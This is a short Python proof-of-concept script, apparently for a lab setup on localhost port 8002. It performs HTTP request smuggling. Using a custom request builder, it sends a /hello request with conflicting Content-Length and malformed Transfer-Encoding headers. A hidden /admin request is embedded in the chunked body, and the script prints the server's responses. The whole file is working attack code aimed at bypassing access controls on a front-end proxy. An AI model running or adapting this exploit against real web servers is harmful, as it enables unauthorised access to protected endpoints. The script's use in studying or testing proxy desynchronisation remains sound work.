#!/usr/bin/env python3
import socket
from request_builder import Request_Builder
import time

HOST = '0.0.0.0'
PORT = 8002

admin_request_builder = Request_Builder()
admin_request_builder.url = "/admin"
admin_request_builder.host = "{}:{}".format(HOST, PORT)
admin_request = admin_request_builder.build()

hello_request_builder = Request_Builder()
hello_request_builder.url = "/hello"
hello_request_builder.host = "{}:{}".format(HOST, PORT)
hello_request_builder.add_content_length_header = True

hello_request_builder.content_length_offset = - len(admin_request) + len(hex(len(admin_request)).replace("0x", "") + "\r\n")
hello_request_builder.add_chunked_encoding_header = True
hello_request_builder.add_chunked_encoding_header_value = "asd"
hello_request_builder.add_chunked_encoding_body = True
hello_request_builder.body = admin_request
hello_request = hello_request_builder.build()

extra_request_builder = Request_Builder()
extra_request_builder.url = "/hello"
extra_request_builder.host = "{}:{}".format(HOST, PORT)
extra_request = extra_request_builder.build()

msg = hello_request + extra_request
print("SEND:")
print(msg)
print("RAW:")
print(msg.encode("ascii"))

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(msg.encode("ascii"))
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
    time.sleep(1)
    response = s.recv(1024).decode("ascii")
    print("RECEIVED:")
    print(response)
